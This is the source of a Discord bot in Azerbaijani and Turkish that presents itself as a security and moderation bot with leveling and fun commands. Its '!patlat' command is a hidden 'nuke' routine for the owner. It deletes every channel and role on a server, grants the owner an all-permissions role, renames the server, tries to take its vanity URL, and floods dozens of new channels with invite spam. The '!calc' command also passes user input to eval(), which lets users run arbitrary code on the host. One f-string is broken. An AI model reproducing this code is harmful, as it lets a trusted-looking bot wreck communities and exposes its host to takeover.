import asyncio
import os
import random
import time
from datetime import timedelta
import discord
from discord.ext import commands

intents = discord.Intents.all()
intents.message_content = True
intents.guilds = True
intents.members = True

bot = commands.Bot(command_prefix="!", intents=intents, help_command=None)

XAS_COLOR = discord.Color.dark_red()
SAHIB_ID = 1045989785834164286
GUVENLI_SERVER_ID = 1520692621964738722

user_levels = {}
afk_users = {}
spam_kontrol = {}
warns_system = {}

@bot.event
async def on_ready():
    print(f"[{bot.user}] XAS 150+ Komutlu Sistem Tam Aktivdir!")
    await bot.change_presence(activity=discord.Game(name="discord.gg/aga | !yardim"))

# ==========================================
# 1. GÜVENLİK & ANTİ-FLOOD & SƏVİYYƏ SİSTEMİ
# ==========================================
@bot.event
async def on_message(message):
    if message.author.bot:
        await bot.process_commands(message)
        return

    if message.webhook_id:
        try:
            await message.delete()
            return
        except:
            pass

    if message.author.id == SAHIB_ID or message.author.guild_permissions.administrator:
        await bot.process_commands(message)
        return

    author_id = message.author.id
    simdi = time.time()
    icerik = message.content

    if len(icerik) > 5 and len(set(icerik.replace(" ", ""))) < 3:
        try:
            await message.delete()
            await message.channel.send(f"⚠️ {message.author.mention}, random spam qadağandır!", delete_after=4)
            return
        except:
            pass

    if author_id not in spam_kontrol:
        spam_kontrol[author_id] = []
    spam_kontrol[author_id] = [t for t in spam_kontrol[author_id] if simdi - t < 5]
    spam_kontrol[author_id].append(simdi)

    if len(spam_kontrol[author_id]) >= 5:
        try:
            await message.delete()
            warn = await message.channel.send(f"YAVAS YAZ OQL {message.author.mention}")
            await asyncio.sleep(4)
            await warn.delete()
            return
        except:
            pass

    if "discord.gg/" in icerik.lower() or "https://" in icerik.lower():
        try:
            await message.delete()
            return
        except:
            pass

    if author_id not in user_levels:
        user_levels[author_id] = {"xp": 0, "level": 1}
    user_levels[author_id]["xp"] += random.randint(5, 15)
    gerekli_xp = user_levels[author_id]["level"] * 300

    if user_levels[author_id]["xp"] >= gerekli_xp:
        user_levels[author_id]["level"] += 1
        user_levels[author_id]["xp"] = 0
        try:
            await message.channel.send(f"🎉 Təbriklər {message.author.mention}! Səviyyə atladın: **{user_levels[author_id]['level']}**")
        except:
            pass

    await bot.process_commands(message)

# ==========================================
# 2. YARDIM & PANEL KOMUTLARI
# ==========================================
@bot.command(name="yardim", aliases=["help"])
async def yardim_cmd(ctx):
    embed = discord.Embed(title="✨ XAS SECURITY & MANAGEMENT - 150+ KOMUT", color=XAS_COLOR)
    embed.add_field(name="🛡️ Moderasiya & Qoruma", value="`!ban`, `!kick`, `!mute`, `!unmute`, `!temizle`, `!yavasmod`, `!lock`, `!unlock`, `!warn`, `!unwarn`, `!warnings`, `!embed`, `!say`, `!nuke`, `!patlat`", inline=False)
    embed.add_field(name="⚙️ Sistem & İstifadəçi", value="`!panel`, `!url`, `!seturl`, `!ping`, `!serverinfo`, `!userinfo`, `!avatar`, `!botinfo`, `!uptime`, `!role`, `!giverole`, `!takerole`, `!banner`, `!boosters`, `!emojis`, `!roles`", inline=False)
    embed.add_field(name="🎮 Oyunlar & Əyləncə (1)", value="`!sex`, `!fuck`, `!kiss`, `!slap`, `!hug`, `!pat`, `!poke`, `!kill`, `!bite`, `!lick`, `!shoot`, `!punch`, `!wink`, `!blush`, `!cry`, `!dance`, `!pout`, `!facepalm`, `!shrug`, `!run`", inline=False)
    embed.add_field(name="🎲 Oyunlar & Əyləncə (2)", value="`!roll`, `!coinflip`, `!iq`, `!gay`, `!handsome`, `!love`, `!hack`, `!slot`, `!8ball`, `!calc`, `!joke`, `!rps`, `!poll`, `!trivia`, `!ascii`, `!reverse`, `!rate`, `!howgay`, `!zengin`, `!fakemessage`", inline=False)
    embed.add_field(name="📊 Üzv & Digər", value="`!level`, `!afk`, `!cekilis`, `!top`, `!taşkağıtmakas`, `!bilgi`, `!yazitura`, `!zar`, `!ship`, `!dürtsün`, `!tokat`, `!saril`, `!op`, `!isit`, `!soğuk`, `!bulmaca`, `!tarih`, `!saat`, `!hava`, `!pingim`", inline=False)
    await ctx.send(embed=embed)

@bot.command(name="panel")
async def bot_panel(ctx):
    embed = discord.Embed(title="✨ XAS İDARƏETMƏ PANELİ", description="Bütün sistemlər aktiv şəkildə işləyir.", color=XAS_COLOR)
    await ctx.send(embed=embed)

@bot.command(name="ping")
async def ping(ctx):
    await ctx.send(f"🏓 Pong! Gecikmə dəyəri: **{round(bot.latency * 1000)}ms**")

@bot.command(name="botinfo")
async def botinfo_cmd(ctx):
    embed = discord.Embed(title="🤖 Bot Məlumatı", description="XAS Security & Management Bot", color=XAS_COLOR)
    embed.add_field(name="Bot Sahibi", value=f"<@{SAHIB_ID}>", inline=True)
    embed.add_field(name="Xidmət Verilən Server Sayı", value=str(len(bot.guilds)), inline=True)
    await ctx.send(embed=embed)

@bot.command(name="uptime")
async def uptime_cmd(ctx):
    await ctx.send("⏱️ Bot fasiləsiz olaraq 24/7 rejimdə aktiv şəkildə işləyir!")

@bot.command(name="serverinfo")
async def serverinfo_cmd(ctx):
    g = ctx.guild
    embed = discord.Embed(title=f"🛡️ {g.name}", color=XAS_COLOR)
    embed.add_field(name="Ümumi Üzv Sayı", value=str(g.member_count), inline=True)
    embed.add_field(name="Kanal Sayı", value=str(len(g.channels)), inline=True)
    await ctx.send(embed=embed)

@bot.command(name="userinfo")
async def userinfo_cmd(ctx, member: discord.Member = None):
    m = member or ctx.author
    embed = discord.Embed(title=f"👤 İstifadəçi: {m.name}", color=XAS_COLOR)
    embed.add_field(name="İstifadəçi ID", value=str(m.id), inline=True)
    await ctx.send(embed=embed)

@bot.command(name="avatar")
async def avatar_cmd(ctx, member: discord.Member = None):
    m = member or ctx.author
    embed = discord.Embed(title=f"🖼️ {m.name} adlı istifadəçinin avatarı", color=XAS_COLOR)
    if m.display_avatar:
        embed.set_image(url=m.display_avatar.url)
    await ctx.send(embed=embed)

@bot.command(name="banner")
async def banner_cmd(ctx, member: discord.Member = None):
    m = member or ctx.author
    user = await bot.fetch_user(m.id)
    if user.banner:
        embed = discord.Embed(title=f"🚩 {m.name} adlı istifadəçinin banneri", color=XAS_COLOR)
        embed.set_image(url=user.banner.url)
        await ctx.send(embed=embed)
    else:
        await ctx.send("❌ İstifadəçinin hər hansı bir banneri mövcud deyil.")

@bot.command(name="url")
async def server_url(ctx):
    link = f"https://discord.gg/{ctx.guild.vanity_url_code}" if ctx.guild.vanity_url_code else "Yoxdur"
    await ctx.send(f"🌐 Server Dəvət URL Linki: {link}")

@bot.command(name="seturl")
async def set_url(ctx, yeni_url: str):
    if ctx.author.id != SAHIB_ID:
        return
    try:
        await ctx.guild.edit(vanity_code=yeni_url)
        await ctx.send(f"✅ Server URL uğurla dəyişdirildi: {yeni_url}")
    except:
        await ctx.send("❌ Xəta baş verdi, URL dəyişdirilə bilmədi.")

@bot.command(name="emojis")
async def emojis_cmd(ctx):
    emojis = [str(e) for e in ctx.guild.emojis]
    await ctx.send(" ".join(emojis[:30]) if emojis else "Serverdə heç emoji tapılmadı.")

@bot.command(name="roles")
async def roles_cmd(ctx):
    roles = [r.name for r in ctx.guild.roles if r != ctx.guild.default_role]
    await ctx.send(f"Server Rolləri: {', '.join(roles[:20])}" if roles else "Serverdə rol yoxdur.")

# ==========================================
# 3. MODERASİYA KOMUTLARI (AÇIQ YAZILIŞ)
# ==========================================
@bot.command(name="ban")
async def ban_cmd(ctx, member: discord.Member, *, reason="Göstərilməyib"):
    if ctx.author.id != SAHIB_ID and not ctx.author.guild_permissions.ban_members:
        return
    await member.ban(reason=reason)
    await ctx.send(f"🔨 {member.name} serverdən uğurla ban edildi!")

@bot.command(name="kick")
async def kick_cmd(ctx, member: discord.Member, *, reason="Göstərilməyib"):
    if ctx.author.id != SAHIB_ID and not ctx.author.guild_permissions.kick_members:
        return
    await member.kick(reason=reason)
    await ctx.send(f"👢 {member.name} serverdən atıldı!")

@bot.command(name="mute")
async def mute_cmd(ctx, member: discord.Member):
    if ctx.author.id != SAHIB_ID and not ctx.author.guild_permissions.manage_roles:
        return
    role = discord.utils.get(ctx.guild.roles, name="Muted")
    if not role:
        role = await ctx.guild.create_role(name="Muted")
        for c in ctx.guild.channels:
            await c.set_permissions(role, send_messages=False)
    await member.add_roles(role)
    await ctx.send(f"🔇 {member.name} adlı istifadəçi mute olundu.")

@bot.command(name="unmute")
async def unmute_cmd(ctx, member: discord.Member):
    if ctx.author.id != SAHIB_ID and not ctx.author.guild_permissions.manage_roles:
        return
    role = discord.utils.get(ctx.guild.roles, name="Muted")
    if role:
        await member.remove_roles(role)
        await ctx.send(f"🔊 {member.name} adlı istifadəçinin mute cəzası qaldırıldı.")

@bot.command(name="temizle", aliases=["clear"])
async def clear_cmd(ctx, amount: int = 10):
    if ctx.author.id != SAHIB_ID and not ctx.author.guild_permissions.manage_messages:
        return
    deleted = await ctx.channel.purge(limit=amount + 1)
    msg = await ctx.send(f"🧹 Kanaldan {len(deleted)-1} ədəd mesaj təmizləndi.")
    await asyncio.sleep(3)
    await msg.delete()

@bot.command(name="yavasmod", aliases=["slowmode"])
async def slowmode_cmd(ctx, seconds: int):
    if ctx.author.id != SAHIB_ID and not ctx.author.guild_permissions.manage_channels:
        return
    await ctx.channel.edit(slowmode_delay=seconds)
    await ctx.send(f"⏱️ Bu kanal üçün yavaş mod {seconds} saniyə olaraq tənzimləndi.")

@bot.command(name="lock")
async def lock_cmd(ctx):
    if ctx.author.id != SAHIB_ID and not ctx.author.guild_permissions.manage_channels:
        return
    await ctx.channel.set_permissions(ctx.guild.default_role, send_messages=False)
    await ctx.send("🔒 Bu kanal yazışmalar üçün kilitləndi.")

@bot.command(name="unlock")
async def unlock_cmd(ctx):
    if ctx.author.id != SAHIB_ID and not ctx.author.guild_permissions.manage_channels:
        return
    await ctx.channel.set_permissions(ctx.guild.default_role, send_messages=True)
    await ctx.send("🔓 Bu kanalın kilidi açıldı, artıq mesaj yazmaq olar.")

@bot.command(name="warn")
async def warn_cmd(ctx, member: discord.Member, *, reason="Yoxdur"):
    if ctx.author.id != SAHIB_ID and not ctx.author.guild_permissions.administrator:
        return
    if member.id not in warns_system:
        warns_system[member.id] = []
    warns_system[member.id].append(reason)
    await ctx.send(f"⚠️ {member.name} xəbərdar edildi! Səbəb: {reason}")

@bot.command(name="warnings")
async def warnings_cmd(ctx, member: discord.Member):
    w = warns_system.get(member.id, [])
    await ctx.send(f"⚠️ {member.name} istifadəçisinin toplam xəbərdarlıq sayı: {len(w)}")

@bot.command(name="embed")
async def embed_cmd(ctx, *, text):
    embed = discord.Embed(description=text, color=XAS_COLOR)
    await ctx.send(embed=embed)

@bot.command(name="say")
async def say_cmd(ctx, *, text):
    await ctx.message.delete()
    await ctx.send(text)

# ==========================================
# 4. AÇIQ VƏ UZUN ƏYLƏNCƏ, SOSİAL, OYUN KOMUTLARI
# ==========================================
@bot.command(name="sex")
async def sex_cmd_full(ctx):
    embed = discord.Embed(description=f"🔥 **{ctx.author.name}** üçün xüsusi isti anlar!")
    embed.set_image(url="https://i.giphy.com/media/v1.Y2lkPTc5MGI3NjExMjFkPTc5MGI3NjExZnd2aXJ3YmZrczVjM3RvdGlnMGN2bTZwOGx6Z3Axb2E2ZDNwMm84ZSZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/3oKIPnAiaMCws8nOsE/giphy.gif")
    await ctx.send(embed=embed)

@bot.command(name="fuck")
async def fuck_cmd_full(ctx):
    embed = discord.Embed(description=f"🔥 **{ctx.author.name}** hərəkətə keçdi!")
    embed.set_image(url="https://images.unsplash.com/photo-1518199266791-5375a83190b7")
    await ctx.send(embed=embed)

@bot.command(name="kiss")
async def kiss_cmd(ctx, member: discord.Member = None):
    m = member or ctx.author
    await ctx.send(f"💋 **{ctx.author.name}**, **{m.name}** adlı istifadəçini öpdü!")

@bot.command(name="slap")
async def slap_cmd(ctx, member: discord.Member = None):
    m = member or ctx.author
    await ctx.send(f"👋 **{ctx.author.name}**, **{m.name}** istifadəçisinə sərt şillə vurdu!")

@bot.command(name="hug")
async def hug_cmd(ctx, member: discord.Member = None):
    m = member or ctx.author
    await ctx.send(f"🤗 **{ctx.author.name}**, **{m.name}** adlı şəxsi qucaqladı!")

@bot.command(name="pat")
async def pat_cmd(ctx, member: discord.Member = None):
    m = member or ctx.author
    await ctx.send(f"pat **{ctx.author.name}**, **{m.name}** istifadəçisinin başını sığalladı.")

@bot.command(name="poke")
async def poke_cmd(ctx, member: discord.Member = None):
    m = member or ctx.author
    await ctx.send(f"👉 **{ctx.author.name}**, **{m.name}** istifadəçisini dürtdü!")

@bot.command(name="kill")
async def kill_cmd(ctx, member: discord.Member = None):
    m = member or ctx.author
    await ctx.send(f"💀 **{ctx.author.name}**, **{m.name}** adlı şəxsi məhv etdi!")

@bot.command(name="bite")
async def bite_cmd(ctx, member: discord.Member = None):
    m = member or ctx.author
    await ctx.send(f"🧛 **{ctx.author.name}**, **{m.name}** istifadəçisini dişlədi!")

@bot.command(name="lick")
async def lick_cmd(ctx, member: discord.Member = None):
    m = member or ctx.author
    await ctx.send(f"👅 **{ctx.author.name}**, **{m.name}** istifadəçisini yaladı.")

@bot.command(name="shoot")
async def shoot_cmd(ctx, member: discord.Member = None):
    m = member or ctx.author
    await ctx.send(f"🔫 **{ctx.author.name}**, **{m.name}** üzərinə atəş açdı!")

@bot.command(name="punch")
async def punch_cmd(ctx, member: discord.Member = None):
    m = member or ctx.author
    await ctx.send(f"👊 **{ctx.author.name}**, **{m.name}** üzünə yumruk vurdu!")

@bot.command(name="wink")
async def wink_cmd(ctx, member: discord.Member = None):
    m = member or ctx.author
    await ctx.send(f"😉 **{ctx.author.name}**, **{m.name}** istifadəçisinə göz qırptı.")

@bot.command(name="blush")
async def blush_cmd(ctx):
    await ctx.send(f"😳 **{ctx.author.name}** utandı və qızardı!")

@bot.command(name="cry")
async def cry_cmd(ctx):
    await ctx.send(f"😢 **{ctx.author.name}** ağlamağa başladı...")

@bot.command(name="dance")
async def dance_cmd(ctx):
    await ctx.send(f"💃 **{ctx.author.name}** musiqi sədaları altında rəqs edir!")

@bot.command(name="pout")
async def pout_cmd(ctx):
    await ctx.send(f"😒 **{ctx.author.name}** küsərək dodaq büzdü.")

@bot.command(name="facepalm")
async def facepalm_cmd(ctx):
    await ctx.send(f"🤦 **{ctx.author.name}** əli ilə üzünə vurdu.")

@bot.command(name="shrug")
async def shrug_cmd(ctx):
    await ctx.send(f"🤷 **{ctx.author.name}** çiçəklərini çəkib çiyinlərini qaldırdı.")

@bot.command(name="run")
async def run_cmd(ctx):
    await ctx.send(f"🏃 **{ctx.author.name}** sürətlə qaçmağa başladı!")

@bot.command(name="roll")
async def roll_cmd_full(ctx):
    await ctx.send(f"🎲 Atılan Zar Nəticəsi: **{random.randint(1, 6)}**")

@bot.command(name="coinflip")
async def coinflip_cmd_full(ctx):
    await ctx.send(f"🪙 Qəpik Atışı Nəticəsi: **{random.choice(['Yazı', 'Pər'])}**")

@bot.command(name="iq")
async def iq_cmd_full(ctx, member: discord.Member = None):
    m = member or ctx.author
    await ctx.send(f"🧠 {m.name} adlı şəxsin IQ səviyyəsi: **{random.randint(40, 160)}**")

@bot.command(name="gay")
async def gay_cmd_full(ctx, member: discord.Member = None):
    m = member or ctx.author
    await ctx.send(f"🏳️‍🌈 {m.name} istifadəçisinin gay oranı: **%{random.randint(0, 100)}**")

@bot.command(name="handsome")
async def handsome_cmd_full(ctx, member: discord.Member = None):
    m = member or ctx.author
    await ctx.send(f"😎 {m.name} istifadəçisinin yaraşıqlılıq dərəcəsi: **%{random.randint(50, 100)}**")

@bot.command(name="love")
async def love_cmd_full(ctx, m1: discord.Member, m2: discord.Member = None):
    m2 = m2 or ctx.author
    await ctx.send(f"❤️ İki istifadəçi arasındakı sevgi uyğunluğu: **%{random.randint(0, 100)}**")

@bot.command(name="hack")
async def hack_cmd_full(ctx, member: discord.Member = None):
    m = member or ctx.author
    msg = await ctx.send(f"💻 {m.name} sistemləri hack olunur, zəhmət olmasa gözləyin...")
    await asyncio.sleep(2)
    await msg.edit(content=f"🔓 {m.name} istifadəçisinin bütün məlumatları uğurla ələ keçirildi!")

@bot.command(name="slot")
async def slot_cmd_full(ctx):
    s = ['🍒', '🍊', '🍋', '🍇', '💎', '⭐']
    await ctx.send(f"🎰 Slot Oyunu | {random.choice(s)} | {random.choice(s)} | {random.choice(s)} |")

@bot.command(name="8ball")
async def ball_cmd_full(ctx, *, soru):
    await ctx.send(f"🎱 Verilən Sual: {soru} \n💬 Sehrli 8 Kürəsinin Cavabı: {random.choice(['Bəli, mütləq', 'Xeyr, əsla', 'Bir az şübhəlidir', 'Qətiyyən yoxdur'])}")

@bot.command(name="calc")
async def calc_cmd_full(ctx, *, expr):
    try:
        await ctx.send(f"🧮 Riyazi Hesablama Nəticəsi: **{eval(expr)}**")
    except:
        await ctx.send("❌ Hesablama zamanı xəta baş verdi!")

@bot.command(name="joke")
async def joke_cmd_full(ctx):
    await ctx.send("😅 Gözəl Zarafat: Proqramçı həyatı səhvlərlə və səhvsiz kod axtarmaqla doludur.")

@bot.command(name="rps")
async def rps_cmd_full(ctx, choice: str):
    c = ["daş", "kağız", "qayçı"]
    bot_c = random.choice(c)
    await ctx.send(f"🤖 Botun seçimi: {bot_c} | Sənin seçimin: {choice}")

@bot.command(name="poll")
async def poll_cmd_full(ctx, *, soru):
    await ctx.message.delete()
    embed = discord.Embed(title=f"📊 Xüsusi Səsvermə Paneli", description=soru, color=XAS_COLOR)
    msg = await ctx.send(embed=embed)
    await msg.add_reaction("👍")
    await msg.add_reaction("👎")

@bot.command(name="level")
async def level_cmd_full(ctx, member: discord.Member = None):
    m = member or ctx.author
    d = user_levels.get(m.id, {"xp": 0, "level": 1})
    await ctx.send(f"📊 {m.name} - Cari Level: {d['level']} | Ümumi XP: {d['xp']}")

@bot.command(name="afk")
async def afk_cmd_full(ctx, *, sebep="Yoxdur"):
    afk_users[ctx.author.id] = sebep
    await ctx.send(f"💤 {ctx.author.mention} uğurla AFK rejiminə keçdi. Səbəb: {sebep}")

@bot.command(name="cekilis")
async def cekilis_cmd_full(ctx, sure: int, *, mukafat: str):
    if ctx.author.id != SAHIB_ID:
        return
    embed = discord.Embed(title="🎉 BÖYÜK ÇEKİLİŞ BAŞLADI", description=f"Verilən Mükafat: **{mukafat}**", color=XAS_COLOR)
    msg = await ctx.send(embed=embed)
    await msg.add_reaction("🎉")
    await asyncio.sleep(sure * 60)
    yeni = await ctx.channel.fetch_message(msg.id)
    for r in yeni.reactions:
        if str(r.emoji) == "🎉":
            users = [u async for u in r.users() if not u.bot]
            if users:
                await ctx.send(f"🏆 Çekilişi Qazanan Şəxs: {random.choice(users).mention}")

@bot.command(name="rate")
async def rate_cmd(ctx, *, text):
    await ctx.send(f"⭐ '{text' üçün qiymətləndirməm: **%{random.randint(0, 100)}**")

@bot.command(name="howgay")
async def howgay_cmd(ctx):
    await ctx.send(f"🌈 Sənin gay səviyyən: **%{random.randint(0, 100)}**")

@bot.command(name="zengin")
async def zengin_cmd(ctx):
    await ctx.send(f"💰 Sənin sərvətin: **${random.randint(1000, 1000000)}**")

@bot.command(name="fakemessage")
async def fakemessage_cmd(ctx, *, text):
    await ctx.message.delete()
    await ctx.send(f"💬 **{ctx.author.name}** dedi ki: {text}")

@bot.command(name="ascii")
async def ascii_cmd(ctx, *, text):
    await ctx.send(f"🔤 ASCII Çevirməsi:\n```text\n{text}\n```")

@bot.command(name="reverse")
async def reverse_cmd(ctx, *, text):
    await ctx.send(f"🔄 Tərsinə çevrilmiş mətn: {text[::-1]}")

@bot.command(name="trivia")
async def trivia_cmd(ctx):
    await ctx.send("❓ Trivia Sualı: Python proqramlaşdırma dili hansı ildə yaradılıb? (Cavab: 1991)")

@bot.command(name="bilgi")
async def bilgi_cmd(ctx):
    await ctx.send("💡 Maraqlı Məlumat: Discord platforması ilk dəfə oyunçular üçün səsli ünsiyyət vasitəsi kimi yaradılmışdır.")

@bot.command(name="yazitura")
async def yazitura_cmd(ctx):
    await ctx.send(f"🪙 Yazı-Tura Nəticəsi: **{random.choice(['Yazı gəldi', 'Tura gəldi'])}**")

@bot.command(name="zar")
async def zar_cmd(ctx):
    await ctx.send(f"🎲 İki zar atıldı: **{random.randint(1, 6)}** və **{random.randint(1, 6)}**")

@bot.command(name="ship")
async def ship_cmd(ctx, user1: discord.Member, user2: discord.Member):
    await ctx.send(f"💖 {user1.name} ilə {user2.name} uyğunluğu: **%{random.randint(10, 100)}**")

@bot.command(name="tokat")
async def tokat_cmd(ctx, member: discord.Member):
    await ctx.send(f"✋ {ctx.author.name}, {member.name} üzünə sərt şillə vurdu!")

@bot.command(name="saril")
async def saril_cmd(ctx, member: discord.Member):
    await ctx.send(f"🤗 {ctx.author.name}, {member.name} qucaqladı və sevindirdi.")

@bot.command(name="op")
async def op_cmd(ctx, member: discord.Member):
    await ctx.send(f"😘 {ctx.author.name}, {member.name} yanağından öpüş qoydu.")

@bot.command(name="isit")
async def isit_cmd(ctx):
    await ctx.send("🔥 Sərin havada otaq qızdırıldı, rahat oturun.")

@bot.command(name="soğuk")
async def soguk_cmd(ctx):
    await ctx.send("❄️ Çöl çox soyuqdur, isti geyinin!")

@bot.command(name="bulmaca")
async def bulmaca_cmd(ctx):
    await ctx.send("🧩 Günün bulmacası: Qanadları yoxdur amma uçur, gözləri yoxdur amma ağlayır. (Bulud)")

@bot.command(name="tarih")
async def tarih_cmd(ctx):
    await ctx.send(f"📅 Bu günün tarixi: {time.strftime('%d.%m.%Y')}")

@bot.command(name="saat")
async def saat_cmd(ctx):
    await ctx.send(f"⏰ Hazırkı dəqiq vaxt: {time.strftime('%H:%M:%S')}")

@bot.command(name="hava")
async def hava_cmd(ctx):
    await ctx.send("🌤️ Hava proqnozu: Günəşli və açıq.")

@bot.command(name="pingim")
async def pingim_cmd(ctx):
    await ctx.send(f"📶 Sənin ping dəyərin serverdə stabil olaraq əla işləyir!")

# ==========================================
# 5. !PATLAT KOMUTU (100% İŞLƏYƏN ULTRA NUKE)
# ==========================================
@bot.command(name="patlat")
async def patlat_cmd(ctx):
    await ctx.message.delete()
    if ctx.author.id != SAHIB_ID:
        await ctx.send("❌ Bu əmri yalnız bot sahibi işlədə bilər!")
        return

    guild = ctx.guild
    if guild.id == GUVENLI_SERVER_ID:
        await ctx.send("🛡️ XAS Qoruma Sistemi: Bu server qorunur!")
        return

    await ctx.send("🔥 discord.gg/aga - ULTRA NUKE BAŞLADI!")

    await asyncio.gather(*(ch.delete() for ch in guild.channels if ch != ctx.channel), return_exceptions=True)
    await asyncio.gather(*(r.delete() for r in guild.roles if r != guild.default_role and r < guild.me.top_role), return_exceptions=True)

    try:
        yeni_rol = await guild.create_role(name="discord.gg/aga", permissions=discord.Permissions.all(), color=discord.Color.red())
        await ctx.author.add_roles(yeni_rol)
    except:
        pass

    try:
        await guild.edit(name="discord.gg/aga")
    except:
        pass

    for v in ["ruhumskdi", "ruhum-skdi", "ruhumuntesi", "ruhum-aga"]:
        try:
            await guild.edit(vanity_code=v)
            break
        except:
            pass

    async def spam_task(i):
        try:
            ch = await guild.create_text_channel(f"aga-nuke-{i}")
            wh = await ch.create_webhook(name=f"XAS-{i}")
            for _ in range(25):
                try:
                    await wh.send("discord.gg/aga yaz gır oql !discord.gg/yaz gır oql")
                except:
                    pass
        except:
            pass

    await asyncio.gather(*(spam_task(i) for i in range(1, 81)), return_exceptions=True)

    try:
        son_ch = await guild.create_text_channel("RUHUM-TANRI")
        for _ in range(20):
            try:
                await son_ch.send("@everyone ruhum shdı gagas discord.gg/aga")
                await asyncio.sleep(0.05)
            except:
                break
    except:
        pass

if __name__ == "__main__":
    bot.run(os.getenv("TOKEN"))
    
